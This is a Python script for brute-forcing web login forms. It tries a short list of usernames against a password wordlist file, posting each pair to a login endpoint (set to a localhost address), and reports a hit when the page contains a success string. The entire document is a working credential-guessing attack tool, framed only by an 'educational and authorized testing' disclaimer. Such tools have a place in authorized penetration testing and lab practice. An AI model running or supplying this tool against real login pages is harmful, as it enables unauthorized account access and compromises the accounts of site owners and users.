#!/usr/bin/env python3
"""
Web login form brute forcing tool.
For educational purposes and authorized security testing only.
"""
import requests
import sys

# Configuration
target = "http://127.0.0.1:5000"
usernames = ["admin", "user", "test"]
passwords_file = "top-100.txt"
needle = "Welcome Back"

print("[*] Starting web login brute force attack")
print(f"[*] Target: {target}")
print(f"[*] Password list: {passwords_file}")
print("-" * 50)

try:
    for username in usernames:
        print(f"\n[*] Testing username: {username}")
        try:
            with open(passwords_file, "r") as passwords_list:
                for password in passwords_list:
                    password = password.strip("\n")
                    sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password))
                    sys.stdout.flush()

                    try:
                        r = requests.post(
                            target,
                            data={"username": username, "password": password},
                            timeout=5
                        )
                        r.raise_for_status()

                        if needle.encode() in r.content:
                            sys.stdout.write("\n")
                            sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(
                                password, username
                            ))
                            sys.exit(0)

                    except requests.exceptions.Timeout:
                        sys.stdout.write("\n[!] Request timeout, retrying...\n")
                        continue
                    except requests.exceptions.ConnectionError:
                        sys.stdout.write("\n[!] Connection error, retrying...\n")
                        continue
                    except requests.exceptions.HTTPError as e:
                        sys.stdout.write(f"\n[!] HTTP error: {e}\n")
                        continue
                    except requests.exceptions.RequestException as e:
                        sys.stdout.write(f"\n[!] Request error: {e}\n")
                        continue

                sys.stdout.flush()
                sys.stdout.write("\n")
                sys.stdout.write("\t[X] No password found for user '{}'\n".format(username))

        except FileNotFoundError:
            print(f"\n[!] Error: Password file '{passwords_file}' not found")
            sys.exit(1)

    print("\n" + "-" * 50)
    print("[*] Attack completed - no valid credentials found")

except KeyboardInterrupt:
    print("\n\n[!] Attack interrupted by user")
    sys.exit(0)